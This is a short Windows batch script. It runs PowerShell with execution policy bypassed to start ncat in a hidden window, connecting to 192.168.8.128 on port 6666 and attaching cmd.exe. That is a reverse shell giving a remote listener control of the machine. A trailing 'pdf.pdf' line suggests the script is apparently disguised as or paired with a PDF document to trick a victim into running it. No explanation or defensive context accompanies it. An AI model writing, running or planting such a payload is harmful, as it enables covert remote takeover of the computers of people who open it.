@echo off
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '.\ncat.exe' -ArgumentList '192.168.8.128 6666 -e cmd.exe' -WindowStyle Hidden"
pdf.pdf